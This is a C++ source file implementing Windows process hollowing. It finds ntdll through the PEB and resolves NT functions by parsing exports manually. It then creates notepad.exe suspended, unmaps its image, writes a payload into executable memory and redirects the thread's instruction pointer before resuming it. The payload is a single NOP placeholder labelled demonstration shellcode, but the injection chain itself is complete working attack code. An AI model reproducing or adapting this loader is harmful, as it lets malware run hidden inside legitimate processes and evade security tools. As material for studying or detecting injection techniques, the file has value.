#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0600
#define STATUS_SUCCESS 0
#include "includes.h"

// Function prototype for NtWriteVirtualMemory
typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)
(
	HANDLE ProcessHandle,
	PVOID BaseAddress,
	PVOID Buffer,
	SIZE_T BufferSize,
	PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)
(
	HANDLE ProcessHandle,
	PVOID BaseAddress
);

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)
(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T RegionSize,
	ULONG AllocationType,
	ULONG Protect
);

typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
	HANDLE ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength,
	PULONG ReturnLength
);

HMODULE GetNtBaseAddr()
{
	PPEB pPeb = (PPEB)__readgsqword(0x60);
	PPEB_LDR_DATA ldr = pPeb->Ldr;
	PLIST_ENTRY list = ldr->InMemoryOrderModuleList.Flink;

	while (list != &ldr->InMemoryOrderModuleList) {
		PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(list, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		if (wcsstr(entry->FullDllName.Buffer, L"ntdll.dll")) {
			return (HMODULE)entry->DllBase;
		}
		list = list->Flink;
	}
	return nullptr;
}

// Below is a function to find the adress of an exported function from ntdll
FARPROC GetProcAddressManual(HMODULE hModule, const char* function) {
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
	if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return nullptr;

	IMAGE_EXPORT_DIRECTORY* pExportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule +
		pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	// Validate export directory exists
	if (!pExportDir->NumberOfNames) return nullptr;

	DWORD* pNames = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfNames);
	WORD* pOrdinals = (WORD*)((BYTE*)hModule + pExportDir->AddressOfNameOrdinals);
	DWORD* pFunctions = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfFunctions);

	for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
		// Validate RVA before accessing
		if (pNames[i] >= pNtHeaders->OptionalHeader.SizeOfImage) continue;

		const char* name = (const char*)((BYTE*)hModule + pNames[i]);
		if (strcmp(name, function) == 0) {
			// Validate function RVA
			DWORD funcRva = pFunctions[pOrdinals[i]];
			if (funcRva >= pNtHeaders->OptionalHeader.SizeOfImage) continue;

			return (FARPROC)((BYTE*)hModule + funcRva);
		}
	}
	return nullptr;
}

PVOID GetProcessImageBase(HANDLE hProcess, HMODULE ntdll)
{
	PROCESS_BASIC_INFORMATION pbi;
	ULONG retLen;
	pNtQueryInformationProcess NtQueryInfo = (pNtQueryInformationProcess)GetProcAddressManual(ntdll, "NtQueryInformationProcess");

	if (!NT_SUCCESS(NtQueryInfo(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen)))
	{
		return nullptr;
	}

	// Read PEB from target process
	PEB peb;
		SIZE_T bytesRead;
		if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead)) {
			return nullptr;
		}

	// For 64-bit PEB: ImageBaseAddress is at offset 0x10
	PVOID imageBase;
	if (!ReadProcessMemory(hProcess, (BYTE*)pbi.PebBaseAddress + 0x10, &imageBase, sizeof(imageBase), &bytesRead)) {
		return nullptr;
	}

	return imageBase;
}

int main()
{
	//https://www.geoffchappell.com/studies/windows/win32/ntdll/index.htm?ta=11&tx=23,50
	
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };

	if (!CreateProcess("C:\\Windows\\System32\\notepad.exe", nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED | PROCESS_VM_OPERATION, nullptr, nullptr, &si, &pi))
	{
		std::cerr << "[ERROR] Could not create notepad in a suspended state " << GetLastError() << std::endl;
		return 1;
	}

	std::cout << "[+] Notepad.exe was created" << std::endl;
	std::cout << "[+] Attemping to retrieve nt functions" << std::endl;

	HMODULE ntdll = GetNtBaseAddr();

	// Hollow out notepad
	PVOID notepadBaseAddress = GetProcessImageBase(pi.hProcess, ntdll);
	if (!notepadBaseAddress)
	{
		std::cerr << "[ERROR] Failed to get image base" << std::endl;
		return 1;
	}

	std::cout << "[+] Got Notepad @ 0x" << notepadBaseAddress << std::endl;

	std::cout << "[+] Got Base Address" << std::endl;
	pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddressManual(ntdll, "NtUnmapViewOfSection");
	std::cout << "[+] Got Unmap" << std::endl;
	pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddressManual(ntdll, "NtWriteVirtualMemory");
	std::cout << "[+] Got WVM" << std::endl;
	pNtAllocateVirtualMemory  NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddressManual(ntdll, "NtAllocateVirtualMemory");
	std::cout << "[+] Got AVMEx" << std::endl;
	if (!NtUnmapViewOfSection || !NtWriteVirtualMemory || !NtAllocateVirtualMemory)
	{
		std::cerr << "Failed to resolve necessary NT functions." << std::endl;
		return 1;
	}

	std::cout << "[+] Resolved NT functions" << std::endl;

	NTSTATUS status = NtUnmapViewOfSection(pi.hProcess, notepadBaseAddress);
	if (status != STATUS_SUCCESS)
	{
		std::cerr << "[ERROR] NtUnmapViewOfSection failed, status: " << std::hex << status << std::endl;
		return 1;
	}
	std::cout << "[+] Unmapped original image from target process." << std::endl;

	HMODULE kernel32 = LoadLibraryA("kernel32.dll");
	FARPROC AllocConsole = GetProcAddress(kernel32, "AllocConsole");
	FARPROC GetStdHandle = GetProcAddress(kernel32, "GetStdHandle");
	FARPROC WriteConsoleA = GetProcAddress(kernel32, "WriteConsoleA");
	FARPROC ExitProcess = GetProcAddress(kernel32, "ExitProcess");

	// x64 shellcode for demonstration
	unsigned char payload[] =
	{
		0x90
	};

	SIZE_T size = sizeof(payload);
	NTSTATUS allocate = NtAllocateVirtualMemory(pi.hProcess, &notepadBaseAddress, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!NT_SUCCESS(allocate))
	{
		std::cerr << "Allocation failed: 0x" << std::hex << allocate << std::endl;
		return 1;
	}

	SIZE_T bytesWritten;
	status = NtWriteVirtualMemory
	(
		pi.hProcess,
		notepadBaseAddress,
		payload,
		sizeof(payload),
		&bytesWritten
	);

	if (!NT_SUCCESS(status))
	{
		std::cerr << "Write failed: 0x" << std::hex << status << std::endl;
		return 1;
	}

	std::cout << "Memory allocated at: " << notepadBaseAddress << std::endl;

	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(pi.hThread, &ctx);
	ctx.Rip = (DWORD64)notepadBaseAddress;
	SetThreadContext(pi.hThread, &ctx);

	// Resume thread
	ResumeThread(pi.hThread);

	// Fix 6: Clean up handles
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	system("pause");
	return 0;
}